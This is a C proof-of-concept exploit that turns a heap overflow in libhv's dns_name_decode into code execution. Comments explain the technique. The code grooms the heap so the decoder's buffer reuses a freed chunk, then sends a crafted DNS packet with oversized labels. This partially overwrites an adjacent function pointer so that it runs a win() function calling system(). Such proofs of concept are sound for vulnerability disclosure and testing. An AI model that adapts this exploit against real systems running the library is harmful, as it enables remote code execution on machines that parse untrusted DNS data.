// libhv dns_name_decode overflow -> code execution (not just a crash).
//
// Build with -no-pie so win()/legit() have fixed low addresses. The overflow
// overwrites the LOW 3 BYTES of an adjacent function pointer to redirect it
// from legit() to win() (x86-64 non-PIE code pointers share the high 5 zero
// bytes, and dns_name_decode can't emit NUL, so a 3-byte partial overwrite is
// the clean primitive). win() then runs a shell command.
#include "dns.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef void (*fn_t)(void);

static void legit(void) {
    puts("[*] legit() called -- exploit FAILED");
}

static void win(void) {
    puts("[*] PWNED: attacker redirected control flow into win()");
    fflush(stdout);
    system("echo '[BREAD] arbitrary code execution' && id");
}

int main(void) {
    fn_t *A = (fn_t *)malloc(280); /* reused as dns->answers */
    fn_t *B = (fn_t *)malloc(280); /* victim: B[0] is the function pointer */
    B[0] = legit;

    uintptr_t win_addr = (uintptr_t)&win;
    printf("[*] win() at %p (low3 = %02x %02x %02x)\n",
           (void *)win_addr,
           (int)(win_addr & 0xff),
           (int)((win_addr >> 8) & 0xff),
           (int)((win_addr >> 16) & 0xff));

    free(A); /* A -> tcache; dns_unpack's malloc(280) will reuse it */

    unsigned char pkt[1024];
    memset(pkt, 0, sizeof(pkt));
    int off = 0;
    /* header: nquestion=0, nanswer=1 */
    pkt[off++] = 0x12; pkt[off++] = 0x34;
    pkt[off++] = 0x81; pkt[off++] = 0x80;
    pkt[off++] = 0x00; pkt[off++] = 0x00;
    pkt[off++] = 0x00; pkt[off++] = 0x01;
    pkt[off++] = 0x00; pkt[off++] = 0x00;
    pkt[off++] = 0x00; pkt[off++] = 0x00;

    /* 4 labels of 63 'A's -> 256 output bytes (positions 0..255) */
    for (int lbl = 0; lbl < 4; lbl++) {
        pkt[off++] = 0x3F;
        for (int i = 0; i < 63; i++) pkt[off++] = 'A';
    }
    /* label 5: 36 content bytes; content[32..34] = win's low 3 bytes,
       content[35] = 0x00 terminates the decoder. Output positions 256..290,
       so positions 288..290 (= B[0..2]) hold win's low 3 bytes. */
    pkt[off++] = 0x3F;
    for (int i = 0; i < 36; i++) {
        if (i == 32)      pkt[off++] = (unsigned char)(win_addr & 0xff);
        else if (i == 33) pkt[off++] = (unsigned char)((win_addr >> 8) & 0xff);
        else if (i == 34) pkt[off++] = (unsigned char)((win_addr >> 16) & 0xff);
        else if (i == 35) pkt[off++] = 0x00; /* terminate decode */
        else              pkt[off++] = 'A';
    }
    /* remaining RR fields (dns_rr_unpack may error; overflow already done) */
    pkt[off++] = 0x00; pkt[off++] = 0x01;
    pkt[off++] = 0x00; pkt[off++] = 0x01;
    pkt[off++] = 0x00; pkt[off++] = 0x00; pkt[off++] = 0x00; pkt[off++] = 0x3c;
    pkt[off++] = 0x00; pkt[off++] = 0x04;
    pkt[off++] = 127; pkt[off++] = 0; pkt[off++] = 0; pkt[off++] = 1;

    dns_t dns;
    memset(&dns, 0, sizeof(dns));
    int r = dns_unpack((char *)pkt, off, &dns);
    printf("[*] dns_unpack returned %d, B[0] = %p\n", r, (void *)B[0]);

    ((fn_t)B[0])(); /* should call win(), not legit() */
    return 0;
}
